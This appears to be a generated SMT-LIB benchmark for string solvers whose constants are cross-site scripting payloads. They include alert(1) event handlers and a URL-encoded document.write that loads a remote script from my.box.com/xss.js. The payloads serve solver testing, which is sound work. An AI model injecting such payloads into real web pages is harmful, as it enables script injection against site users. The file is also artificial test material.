; random_mix, Unicode mode: x, z from disjunctions of constants, y = x ++ z, clauses of 1 to 3 random (negated) constraints of x, y, z: memberships, affixes, contains, lengths, str.at, str.indexof, str.substr, str.replace
(set-logic QF_SLIA)
(set-info :status sat)
(declare-const x String)
(declare-const y String)
(declare-const z String)
(assert (or (= x "<style onkeydown=""alert(1)"" contenteditable>test</style>") (= x "<cite onpaste=""alert(1)"" contenteditable>test</cite>")))
(assert (or (= z "nload=\u{2019}document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)\u{2019}%3E") (= z "editable>test</meter>")))
(assert (= y (str.++ x z)))
(assert (str.contains x """ "))
(assert (or (>= (str.len y) 144) (not (str.contains z "able>tes")) (not (str.in_re y ((_ re.from_regex ecma2020 u) "^(10)$")))))
(assert (or (str.suffixof "st</cite>" x) (not (= (str.len x) 56))))
(assert (or (str.suffixof "(1)></svg>" z) (str.contains (str.replace y "ste" "javascript:") "pajavascript:=""ale")))
(assert (or (= (str.at y 60) ">") (>= (str.len y) 74)))
(assert (str.suffixof "st</meter>" z))
(check-sat)
